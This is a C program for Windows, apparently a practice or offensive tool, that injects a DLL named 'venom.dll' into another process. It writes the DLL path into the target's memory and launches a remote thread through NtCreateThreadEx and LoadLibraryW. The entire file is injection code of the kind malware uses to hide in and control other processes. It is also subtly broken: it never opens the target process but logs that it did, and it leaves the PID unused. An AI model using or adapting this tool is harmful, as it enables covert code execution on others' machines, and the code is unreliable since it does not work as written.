#include "box.h"

HMODULE getMod(LPCWSTR modName) {
  HMODULE hModule = NULL;
  info("Getting module %ls", modName);

  hModule = GetModuleHandleW(modName);

  if (hModule == NULL) {
    warn("Failed to get module %ls", modName);
    return NULL;
  } else {
    ok("Got module %ls", modName);
    info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
    return hModule;
  }
}

int main(int argc, char const *argv[]) {
  DWORD PID = NULL;
  HANDLE hProcess = NULL;
  HANDLE hThread = NULL;
  HMODULE hKernel32 = NULL;
  HMODULE hNTDLL = NULL;
  PVOID rBuffer = NULL;

  wchar_t dllPath[MAX_PATH] = L"C:\\Users\\user\\Downloads\\venom.dll";
  size_t pathSize = sizeof(dllPath);
  size_t bytesWritten = 0;

  OBJECT_ATTRIBUTES OA = {sizeof(OA), NULL};

  if (argc < 2) {
    warn("Usage: %s <PID>", argv[0]);
    return EXIT_FAILURE;
  }

  ok("Got handle to process %s", argv[1]);
  info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);
  info("Getting handle to Kernel32 and NTDLL");

  hNTDLL = getMod(L"ntdll.dll");
  hKernel32 = getMod(L"kernel32.dll");

  if (hNTDLL == NULL || hKernel32 == NULL) {
    warn("Failed to get handle to Kernel32 or NTDLL 0x%p 0x%p", hNTDLL,
         hKernel32);
    return EXIT_FAILURE;
  }

  pNtCreateThreadEx NtCreateThreadEx =
      (pNtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
  ok("Got handle to NtCreateThreadEx 0x%p", NtCreateThreadEx);
  info("\\___[ NtCreateThreadEx\n\t\\_0x%p]\n", NtCreateThreadEx);
  PTHREAD_START_ROUTINE pLoadLibraryW =
      (PTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
  ok("Got handle to LoadLibraryW 0x%p", pLoadLibraryW);
  info("\\___[ LoadLibraryW\n\t\\_0x%p]\n", pLoadLibraryW);

  rBuffer = VirtualAllocEx(hProcess, rBuffer, pathSize,
                           (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

  if (rBuffer == NULL) {
    warn("Failed to allocate memory in remote process");
    goto CLEANUP;
  }

  ok("Allocated memory in remote process");

  WriteProcessMemory(hProcess, rBuffer, dllPath, pathSize, &bytesWritten);
  ok("Wrote %d bytes to remote process", bytesWritten);

  NSTATUS status =
      NtCreateThreadEx(&hThread, GENERIC_ALL, &OA, hProcess, pLoadLibraryW,
                       rBuffer, FALSE, NULL, NULL, NULL, NULL);

  if (status != STATUS_SUCCESS) {
    warn("Failed to create remote thread");
    goto CLEANUP;
  }

  ok("Created remote thread");
  info("\\___[ hThread\n\t\\_0x%p]\n", hThread);
  info("Waiting for remote thread to exit");
  goto CLEANUP;

CLEANUP:
  if (hThread) {
    info("Closing handle to remote thread");
    CloseHandle(hThread);
  }
  if (hProcess) {
    info("Closing handle to remote process");
    CloseHandle(hProcess);
  }

  ok("Exiting");
  return EXIT_SUCCESS;
}
